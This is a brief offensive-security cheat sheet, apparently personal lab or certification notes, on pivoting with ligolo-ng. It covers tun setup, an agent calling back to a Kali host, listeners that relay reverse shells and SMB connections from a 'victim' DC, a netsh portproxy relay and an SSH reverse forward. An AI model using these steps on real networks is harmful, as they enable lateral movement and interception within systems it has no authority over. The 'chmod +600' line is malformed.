```
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```

```
sudo ./proxy -selfcert
```

```
sudo ./agent -connect <YOUR_KALI_IP>:11601 -ignore-cert
```

```
on the proxy
session
enter
start --tun ligolo
```

```
sudo ip route add 172.16.8.0/24 dev ligolo
```


Listeners

| You Want To...            | Listener Type | Command                                                                        |
| ------------------------- | ------------- | ------------------------------------------------------------------------------ |
| Receive an SMB connection | TCP           | `listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp`                     |
| Receive a Reverse Shell   | TCP           | `listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp`                     |
| Receive a File Download   | TCP           | `listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8080 --tcp`                   |
| **Receive a Ping (ICMP)** | **UDP**       | **`listener_add --addr 0.0.0.0:listen_port --to 127.0.0.1:listen_port --udp`** |

all the connections will go to the pivot first, and then be redirected to our kali machine

when the pivot is on windows, we can' do the smb option as windows already uses windows so we can do this

on the pivot forward the 445 connections to another port
```
netsh interface portproxy add v4tov4 listenport=445 listenaddress=0.0.0.0 connectport=8445 connectaddress=127.0.0.1
```

Victim connects to child DC:445 Windows portproxy redirects to localhost:8445 Ligolo listener on 8445 forwards to Kali:445

then on the linux proxy

```
listener_add --addr 0.0.0.0:8445 --to 127.0.0.1:445 --tcp
```


**Note: if we are working on differnet subnets, our kali can't see the jumpbox, we will use port forwarding after connecting using SSH**

```
ssh -R 11601:127.0.0.1:11601 user@<pivot_public_ip>
```

```
sudo ./agent -connect 127.0.0.1:11601 -ignore-cert
```

**Note: make sure to change SSH key mode so you can connect**

```
chmod +600 keyfile
```
